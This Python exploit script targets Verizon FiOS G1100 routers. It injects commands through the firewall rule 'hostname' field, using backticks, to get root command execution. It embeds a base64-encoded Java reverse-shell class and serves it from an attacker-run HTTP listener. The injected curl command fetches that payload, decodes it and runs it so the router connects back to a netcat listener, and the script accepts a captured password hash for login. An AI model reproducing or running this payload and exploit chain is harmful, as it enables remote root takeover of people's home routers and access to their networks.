from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
import requests, urllib, json
import sys
import argparse
import hashlib
import threading
import SocketServer
import time

TIMEOUT = 5 # sec

# this is a reverse shell written in Java
# targeted for Java SE 1.8
REVERSE_SHELL = ("yv66vgAAADQA4wcAAgEAD1JldmVyc2VUY3BTaGVsbAcABAEAEGphdmEvbGFuZy9PYmplY3QBAAY8aW5pdD4BAAMoKVYBAARDb2RlCgADAAkMAAUABgEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABFMUmV2ZXJzZVRjcFNoZWxsOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWBwARAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyBwATAQAQamF2YS9sYW5nL1N0cmluZwgAFQEACS9iaW4vYmFzaAoAEAAXDAAFAA8KABAAGQwAGgAbAQATcmVkaXJlY3RFcnJvclN0cmVhbQEAHShaKUxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7CgAQAB0MAB4AHwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7CgAhACMHACIBABFqYXZhL2xhbmcvUHJvY2VzcwwAJAAlAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwoAIQAnDAAoACkBAA9nZXRPdXRwdXRTdHJlYW0BABgoKUxqYXZhL2lvL091dHB1dFN0cmVhbTsKACsALQcALAEAFGphdmEvbmV0L0luZXRBZGRyZXNzDAAuAC8BAAlnZXRCeU5hbWUBACooTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL25ldC9JbmV0QWRkcmVzczsKADEAMwcAMgEAEWphdmEvbGFuZy9JbnRlZ2VyDAA0ADUBAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQkANwA5BwA4AQAQamF2YS9sYW5nL1N5c3RlbQwAOgA7AQADZXJyAQAVTGphdmEvaW8vUHJpbnRTdHJlYW07CAA9AQATSW52YWxpZCBJUCBhZGRyZXNzLgoAPwBBBwBAAQATamF2YS9pby9QcmludFN0cmVhbQwAQgBDAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgoAAQBFDABGAAYBAApwcmludFVzYWdlCgA3AEgMAEkASgEABGV4aXQBAAQoSSlWCABMAQANSW52YWxpZCBwb3J0LgcATgEAGmphdmEvbmV0L0luZXRTb2NrZXRBZGRyZXNzCgBNAFAMAAUAUQEAFihMamF2YS9sYW5nL1N0cmluZztJKVYKAFMAVQcAVAEAH2phdmEvbmlvL2NoYW5uZWxzL1NvY2tldENoYW5uZWwMAFYAVwEABG9wZW4BADsoTGphdmEvbmV0L1NvY2tldEFkZHJlc3M7KUxqYXZhL25pby9jaGFubmVscy9Tb2NrZXRDaGFubmVsOwoAUwBZDABaAFsBABFjb25maWd1cmVCbG9ja2luZwEAKChaKUxqYXZhL25pby9jaGFubmVscy9TZWxlY3RhYmxlQ2hhbm5lbDsKAFMAXQwAXgBfAQAGc29ja2V0AQATKClMamF2YS9uZXQvU29ja2V0OwoAYQAnBwBiAQAPamF2YS9uZXQvU29ja2V0CgBTAGQMAGUAZgEAC2lzQ29ubmVjdGVkAQADKClaCABoAQAlSGVsbG8hCkVudGVyIHNvbWUgc2hlbGwgY29tbWFuZHMuLi4KCgoAEgBqDABrAGwBAAhnZXRCeXRlcwEABCgpW0IKAG4AcAcAbwEAFGphdmEvaW8vT3V0cHV0U3RyZWFtDABxAHIBAAV3cml0ZQEABShbQilWCgB0AHYHAHUBABNqYXZhL25pby9CeXRlQnVmZmVyDAB3AHgBAAhhbGxvY2F0ZQEAGChJKUxqYXZhL25pby9CeXRlQnVmZmVyOwoAUwB6DAB7AHwBAARyZWFkAQAYKExqYXZhL25pby9CeXRlQnVmZmVyOylJCgB0AH4MAH8AbAEABWFycmF5CACBAQAFVVRGLTgKAIMAhQcAhAEAGGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldAwAhgCHAQAHZm9yTmFtZQEALihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldDsKABIAiQwABQCKAQAfKFtCTGphdmEvbmlvL2NoYXJzZXQvQ2hhcnNldDspVgoAEgCMDACNAI4BAAR0cmltAQAUKClMamF2YS9sYW5nL1N0cmluZzsIAEkKABIAkQwAkgCTAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaCgBuAJUMAJYABgEABWZsdXNoBQAAAAAAAABkCgCaAJwHAJsBABBqYXZhL2xhbmcvVGhyZWFkDACdAJ4BAAVzbGVlcAEABChKKVYKAKAAogcAoQEAHmphdmEvbGFuZy9JbnRlcnJ1cHRlZEV4Y2VwdGlvbgwAowAGAQAPcHJpbnRTdGFja1RyYWNlCgClAKcHAKYBABNqYXZhL2lvL0lucHV0U3RyZWFtDAB7AKgBAAMoKUkKAG4AqgwAcQBKCgClAKwMAK0AqAEACWF2YWlsYWJsZQgArwEAAQoKALEAogcAsgEAE2phdmEvaW8vSU9FeGNlcHRpb24KAFMAtAwAtQAGAQAFY2xvc2UKACEAtwwAuAAGAQAHZGVzdHJveQcAugEAHWphdmEvbmV0L1Vua25vd25Ib3N0RXhjZXB0aW9uBwC8AQAfamF2YS9sYW5nL051bWJlckZvcm1hdEV4Y2VwdGlvbgcAvgEAE2phdmEvbGFuZy9FeGNlcHRpb24BAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAnBiAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAARwcm9jAQATTGphdmEvbGFuZy9Qcm9jZXNzOwEAC3Byb2Nfc3Rkb3V0AQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAKcHJvY19zdGRpbgEAFkxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAFlAQAfTGphdmEvbmV0L1Vua25vd25Ib3N0RXhjZXB0aW9uOwEAIUxqYXZhL2xhbmcvTnVtYmVyRm9ybWF0RXhjZXB0aW9uOwEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEABGFkZHIBABxMamF2YS9uZXQvSW5ldFNvY2tldEFkZHJlc3M7AQAHY2hhbm5lbAEAIUxqYXZhL25pby9jaGFubmVscy9Tb2NrZXRDaGFubmVsOwEAB3NvY2tfb3MBAAxjb21tYW5kX2xpbmUBABVMamF2YS9uaW8vQnl0ZUJ1ZmZlcjsBAAdjbWRfc3RyAQASTGphdmEvbGFuZy9TdHJpbmc7AQAgTGphdmEvbGFuZy9JbnRlcnJ1cHRlZEV4Y2VwdGlvbjsBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwDABwDbAQATamF2YS9sYW5nL1Rocm93YWJsZQkANwDdDADeADsBAANvdXQIAOABACdVc2FnZTogUmV2ZXJzZVRjcFNoZWxsLmphdmEgPGlwPiA8cG9ydD4BAApTb3VyY2VGaWxlAQAUUmV2ZXJzZVRjcFNoZWxsLmphdmEAIQABAAMAAAAAAAMAAQAFAAYAAQAHAAAALwABAAEAAAAFKrcACLEAAAACAAoAAAAGAAEAAAAKAAsAAAAMAAEAAAAFAAwADQAAAAkADgAPAAEABwAABA8ABgAMAAABdrsAEFkEvQASWQMSFFO3ABZMKwS2ABhXK7YAHE0stgAgTiy2ACY6BCoDMrgAKlcqBDK4ADBXpwA0OgWyADYSPLYAPrgARAS4AEenACA6BbIANhJLtgA+uABEBLgAR6cADDoFuABEBLgAR7sATVkqAzIqBDK4ADC3AE86BQE6BhkFuABSOgYZBgS2AFhXGQa2AFy2AGA6BxkGtgBjmQCOGQcSZ7YAabYAbacAgREEALgAczoIGQYZCLYAeVe7ABJZGQi2AH0SgLgAgrcAiLYAizoJGQkSj7YAkJoAhxkItgB9AzOaAAanAHoZBBkItgB9tgBtGQS2AJQUAJe4AJmnABY6ChkKtgCfpwAMGQcttgCktgCpLbYAq53/8xkHEq62AGm2AG0ZB7YAlBkGtgBjmv99pwAuOgcZB7YAsBkGxgAIGQa2ALMstgC2pwAsOgsZBsYACBkGtgCzLLYAthkLvxkGxgAIGQa2ALMstgC2pwAITSy2ALCxAAcAJwA1ADgAuQAnADUATAC7ACcANQBgAL0A9wD9AQAAoAB+ATEBNACxAH4BOwFMAAAAFwFtAXAAsQADAAoAAADqADoAAAANABEADgAXABAAHAASACEAEwAnABYALgAXADUAGAA6ABkAQgAaAEUAGwBMABwATgAdAFYAHgBZAB8AYAAgAGIAIQBlACIAaQAlAHsAJgB+ACgAhQApAIwALACWAC0AngAuAKgAMQCrADIAswA1ALsANgDRADgA5QA5AOgAPQDyAD4A9wBCAP0AQwECAEUBBwBJAQoASgETAEkBGgBNASQATwEpADEBMQBSATYAUwE7AFUBQABWAUUAVwFMAFQBTgBVAVMAVgFYAFcBXABYAV8AVQFkAFYBaQBXAW0AWgFxAFsBdQBdAAsAAACiABAAAAF2AL8AwAAAABEBZQDBAMIAAQAcAVEAwwDEAAIAIQFMAMUAxgADACcBRgDHAMgABAA6AA8AyQDKAAUATgAPAMkAywAFAGIABwDJAMwABQB7APIAzQDOAAUAfgDvAM8A0AAGAJYAmwDRAMgABwCzAHYA0gDTAAgA0QBYANQA1QAJAQIABQDJANYACgE2AAUAyQDXAAcBcQAEAMkA1wACANgAAAC3ABL/ADgABQcA2QcAEAcAIQcApQcAbgABBwC5UwcAu1MHAL0I/gBBBwBNBwBTBwBu/QA8BwB0BwASVwcAoAkI+QAV/wAKAAcHANkHABAHACEHAKUHAG4HAE0HAFMAAQcAsRBGBwDa/wALAAwHANkHABAHACEHAKUHAG4HAE0HAFMAAAAABwDaAAD/AAYABwcA2QcAEAcAIQcApQcAbgcATQcAUwAACf8ABgACBwDZBwAQAAEHALEEAAkARgAGAAEABwAAAC0AAgAAAAAACbIA3BLftgA+sQAAAAIACgAAAAoAAgAAAGAACABhAAsAAAACAAAAAQDhAAAAAgDi")

def err_and_exit(msg):
    print '\n\nERROR: ' + msg + '\n\n'
    sys.exit(1)

# This is an info disclosure in itself
def get_password_salt(ip):
    salt = ""
    url = "http://" + ip + "/api"
    r = requests.get(url, timeout=TIMEOUT)
    PWSALT = "passwordSalt"
    if PWSALT in r.text:
        json_decoded = json.loads(r.text)
        if json_decoded[PWSALT] is not None and len(json_decoded[PWSALT]) > 0:
            return json_decoded[PWSALT]
    return None

# success if we get cookies
def login(ip, pw=None, salt=None, hashstr=None):
    url = 'http://' + ip + '/api/login'

    # use password if hashstr is not given
    if hashstr is None:
        m = hashlib.sha512()
        m.update(pw + salt) # password|salt
        hashstr = m.hexdigest()
    # else hashstr stays the same
    data = {'password' : hashstr}
    r = requests.post(url, json=data, timeout=TIMEOUT)
    if r.status_code == 200 and len(r.cookies) > 0:
        return r.cookies
    
    return None

def logout(ip, cookies):
    url = 'http://' + ip + '/api/logout'
    headers = { 'X-XSRF-TOKEN' : cookies['XSRF-TOKEN'] }
    r = requests.get(url, headers=headers, cookies=cookies, timeout=TIMEOUT)
    print r.text
    print r.status_code
    return (r.status_code == 200)

# this is the injection vuln
def inject_command(target_ip, listener, cookies):
    # add the network object and a firewall access control rule
    listener_url = 'http://' + listener['ip'] + ':' + str(listener['port']) + '/'
    target_url = 'http://' + target_ip + '/api/firewall/accesscontrol'

    command = 'cd /mnt/config/'                                 # change directory to writable dir
    command += ' && curl ' + listener_url +' -o sh_b64 '         # download base64 encoded shell (named sh_b64)
    command += ' && base64 -d sh_b64 > ReverseTcpShell.class'    # decode shell and write it as a Java class file
    command += ' && /usr/local/jvm/bin/siege ReverseTcpShell ' + listener['ship'] + ' ' + str(listener['shport']) + ' &'    # execute the shell with an embedded jvm
    command += '"'
    data = {
        "networkObjects": [
            {
                "name" : "Scooby",
                "type":3,
                "rules": [
                    {
                        "networkObjType":4,
                        'hostname': '`' + command + '`'         # command injection vulnerability is here. notice backticks
                    }
                ]
            }
        ],
        "services":[],
        "schedule":"",
        "hosts":[],
        "enabled":True,
        "schedule1":{},
        "blockRule":True
    }
    headers = { 'X-XSRF-TOKEN' : cookies['XSRF-TOKEN'] }
    r = requests.post(target_url, cookies=cookies, json=data, headers=headers, timeout=TIMEOUT)
    return (r.status_code == 200)


# This class will serve as an HTTP listener
class MyWebHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        data = self.path.replace('/', '') # remove leading slash

	msg = REVERSE_SHELL # send the reverse shell back
        self.send_response(200)
        self.end_headers()
        self.wfile.write(str.encode(msg))

# Make the http listener operate on its own thread
class ThreadedWebHandler(object):
    
    def __init__(self, host, port):
        self.server = SocketServer.TCPServer((host, port), MyWebHandler)
        self.server_thread = threading.Thread(target=self.server.serve_forever)
        self.server_thread.daemon = True

    def start(self):
        self.server_thread.start()

    def stop(self):
        self.server.shutdown()
        self.server.server_close()

# MAIN

# This exploit works against 02.01.00.05_20180815_131131_a22d9056_jenkins
#
# Note: This script will cause the router's web interface to not respond for a few minutes after you
# exit the shell. It will come back up.
#
# Example usage:
# Start netcat listener prior to running injection
#
# nc -nlvp 4444
#
# python verizon_g1100_cmd_injection.py -t 192.168.1.1 -pw password1234 -ip 192.168.1.191 -ship 192.168.1.191
# python verizon_g1100_cmd_injection.py -t 192.168.1.1 -hash 5e619e19824b1072f89ff309e3896b1b6dd31aebfab1698b2662d97352d9da9fbdbf7c165239a2214bdf9ae512821e78875a1b515bd4140ec919dda201f1001e -ip 192.168.1.191 -ship 192.168.1.191

desc = 'Verizon FiOS G1100 Authenticated Root Command Injection'
arg_parser = argparse.ArgumentParser(description=desc)
arg_parser.add_argument('-t', required=True, default='192.168.1.1', help='Target Router IP (Required)')
arg_parser.add_argument('-pw', help='Admin Password')
arg_parser.add_argument('-hash', help='Password Hash (captured)')
arg_parser.add_argument('-ip', required=True, help='HTTP listener IP')
arg_parser.add_argument('-port', type=int, default=9999, help='HTTP listener port (Default: 9999)')
arg_parser.add_argument('-ship', required=True, help='Reverse shell listener IP')
arg_parser.add_argument('-shport', type=int, default=4444, help='Reverse shell listener port (Default: 4444)')

args = arg_parser.parse_args()

# router settings
router = dict()
router['ip'] = args.t

# listener settings
listener = dict()
listener['ip'] = args.ip
listener['port'] = args.port
listener['ship'] = args.ship
listener['shport'] = args.shport

# if password was given, grab password salt
if args.pw is not None:
    salt = get_password_salt(router['ip'])
    if not salt:
        err_and_exit("Unable to retrieve password salt.")

    # log in
    cookies = login(router['ip'], args.pw, salt)
else:
    if args.hash is None:
        err_and_exit("Please provide either a password or hash.")
    cookies = login(router['ip'], hashstr=args.hash)

if not cookies:
    err_and_exit("Unable to log in with password.")

# start threaded listener
# thanks http://brahmlower.io/threaded-http-server.html
print "\nListening on " + listener['ip'] + ":" + str(listener['port'])
server = ThreadedWebHandler(listener['ip'], listener['port'])
server.start()

# inject the command
print "\nPerforming command injection."
try:
    success = inject_command(router['ip'], listener, cookies)

    sec = 5
    time.sleep(sec)

    if logout(router['ip'], cookies):
        print 'Logged out.'
    else:
        print 'Couldn\'t log out...'
except requests.exceptions.ReadTimeout:
    print "Check for your shell..."

server.stop()
